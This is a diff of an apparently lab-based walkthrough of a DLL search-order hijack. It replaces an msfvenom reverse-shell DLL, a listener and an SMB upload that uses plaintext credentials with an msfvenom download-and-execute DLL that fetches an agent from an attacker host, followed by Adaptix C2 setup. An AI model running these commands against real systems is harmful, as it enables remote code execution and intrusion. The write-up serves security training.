@@ -561,28 +561,19 @@ Because of DLL search order i can craft a malicious dll then place it in the sam
 
 # Malicious DLL creation
 ```python
-msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.200.50.211 LPORT=1337 -f dll -o reverse.dll
+msfvenom -a x86 -p windows/download_exec EXE=agent.x64.exe URL=http://10.200.50.211:8000/agent.x64.exe -f dll -o dismcore.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No encoder specified, outputting raw payload
-Payload size: 460 bytes
+Payload size: 457 bytes
 Final size of dll file: 9216 bytes
-Saved as: reverse.dll
+Saved as: dismcore.dll
 ```
 This generated the payload but now im realising it needs to be called dismcore.dll
 
-```python
-penelope -p 1337                                        
-[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.200.50.211
-➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
-```
-First ill start a listener
+Next thing ill do is start adaptix C2 then set a listener
 
-```python
-smbclient //dc1.dismay.hsm/Tools -U 'mike.silver'%'Password123!'
-Try "help" to get a list of possible commands.
-smb: \> put dismcore.dll 
-putting file dismcore.dll as \dismcore.dll (0.9 kB/s) (average 0.9 kB/s)
-```
-This put the file in the share so now when the exe is ran it should pull from the current directory which will load my malicious DLL
+![](Pasted%20image%2020260424210253.png)
+
+Now the listener is set i can generate the agent
 
 
